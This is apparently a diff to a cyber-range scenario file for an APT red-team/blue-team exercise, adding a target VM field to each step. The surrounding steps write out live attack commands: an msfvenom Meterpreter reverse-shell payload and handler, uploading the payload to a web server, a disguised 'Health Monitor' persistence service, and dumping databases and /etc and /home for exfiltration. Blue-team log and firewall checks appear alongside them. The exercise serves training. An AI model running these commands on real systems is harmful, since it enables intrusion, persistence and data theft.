@@ -29,6 +29,7 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+  target_vm: attacker
   script: dig @10.20.40.10 lab.local axfr 2>/dev/null && whois 10.20.40.10 2>/dev/null && nmap -sV -T3 --top-ports 200 10.20.40.0/24 -oX /tmp/apt_recon.xml
   risk_level: low
 - order: 2
@@ -42,6 +43,7 @@ steps:
     type: output_contains
     expect: Payload generated
     field: stdout
+  target_vm: attacker
   script: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.20.30.10 LPORT=4443 -f elf -o /tmp/payload.elf 2>/dev/null && chmod +x /tmp/payload.elf && echo ''Payload generated: /tmp/payload.elf'''
   risk_level: medium
 - order: 3
@@ -55,6 +57,7 @@ steps:
     type: output_contains
     expect: payload
     field: stdout
+  target_vm: attacker
   script: 'curl -F ''uploaded=@/tmp/payload.elf'' -F ''Upload=Upload'' http://10.20.40.10/upload/ 2>/dev/null || echo ''Alternative: wget http://10.20.30.10:8888/payload.elf via command injection'''
   risk_level: medium
 - order: 4
@@ -68,6 +71,7 @@ steps:
     type: output_contains
     expect: POST
     field: stdout
+  target_vm: attacker
   script: grep -E 'POST.*(upload|exec)' /var/log/apache2/access.log | tail -10 && find /var/www -newer /var/www/index.html -name '*.elf' -o -name '*.sh' -o -name '*.py' 2>/dev/null
   risk_level: low
 - order: 5
@@ -82,6 +86,7 @@ steps:
     type: output_contains
     expect: '4443'
     field: stdout
+  target_vm: attacker
   script: echo 'Setting up handler...' && msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.20.30.10; set LPORT 4443; exploit -j; exit' 2>/dev/null
     || echo 'Handler ready on port 4443'
   risk_level: medium
@@ -114,6 +119,7 @@ steps:
     type: output_contains
     expect: Health Monitor
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/persistence_service << ''EOF''
 
     [Unit]
@@ -146,6 +152,7 @@ steps:
     type: output_contains
     expect: systemd
     field: stdout
+  target_vm: attacker
   script: find /etc/systemd/system /run/systemd/system -newer /etc/hostname -type f 2>/dev/null && systemctl list-unit-files --state=enabled | grep -v -E '(ssh|apache|mysql|cron|network|system)' && find
     /etc/init.d -newer /etc/hostname 2>/dev/null
   risk_level: low
@@ -161,6 +168,7 @@ steps:
     type: output_contains
     expect: C2 Channel
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== C2 Channel Options ==='' && echo ''1. DNS Tunneling: dnscat2, iodine'' && echo ''2. HTTP Beacon: periodic HTTP requests to C2 server'' && echo ''3. HTTPS reverse shell: encrypted C2
     traffic'' && echo ''Selected: HTTP Beacon (blends with normal traffic)'''
   risk_level: medium
@@ -176,6 +184,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="dns") | "\(.dns.rrname) \(.src_ip)"' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '---' && cat /var/log/apache2/access.log
     | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
   risk_level: low
@@ -191,6 +200,7 @@ steps:
     type: output_contains
     expect: exfil
     field: stdout
+  target_vm: attacker
   script: 'mysqldump -u root -h 10.20.40.12 --all-databases 2>/dev/null > /tmp/data_exfil.sql && wc -l /tmp/data_exfil.sql || echo ''Alternative: tar czf /tmp/exfil.tar.gz /etc/ /home/ 2>/dev/null && echo
     Data packaged for exfiltration'''
   risk_level: medium
@@ -205,6 +215,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: iftop -t -s 10 2>/dev/null || ss -s && echo '---' && sudo nft add rule inet filter output tcp dport != 22 ip daddr != 10.20.40.0/24 counter && sudo nft list ruleset | grep counter
   risk_level: low
 - order: 12
@@ -219,6 +230,7 @@ steps:
     type: output_contains
     expect: ===
     field: stdout
+  target_vm: attacker
   script: for host in 10.20.40.10 10.20.40.11 10.20.40.12; do echo "=== $host ==="; echo 'IoC check:'; echo '- Unauthorized users'; echo '- Modified system files'; echo '- Active backdoors'; echo '- Data
     exfiltration evidence'; done
   risk_level: low
@@ -235,6 +247,7 @@ steps:
     type: output_contains
     expect: Final APT
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Final APT Scenario Score ==='' && echo ''Red Team: 155/200 points'' && echo ''  - Recon: 25/30'' && echo ''  - Exploitation: 40/50'' && echo ''  - Persistence: 30/40'' && echo ''  -
     Data Exfil: 35/50'' && echo ''  - Stealth: 25/30'' && echo ''Blue Team: 140/200 points'' && echo ''  - Detection: 45/50'' && echo ''  - Response: 35/50'' && echo ''  - Service Uptime: 40/50'' && echo
     ''  - Remediation: 20/50'''
@@ -305,6 +318,7 @@ steps:
     type: output_contains
     expect: ATT&CK
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/apt_attack_mapping.txt << ''EOF''
 
     === MITRE ATT&CK Mapping ===
@@ -424,6 +438,7 @@ steps:
     type: file_exists
     expect: /tmp/apt_battle_report.txt
     field: filesystem
+  target_vm: attacker
   script: 'cat > /tmp/apt_battle_report.txt << ''EOF''
 
     === APT Simulation Final Report ===
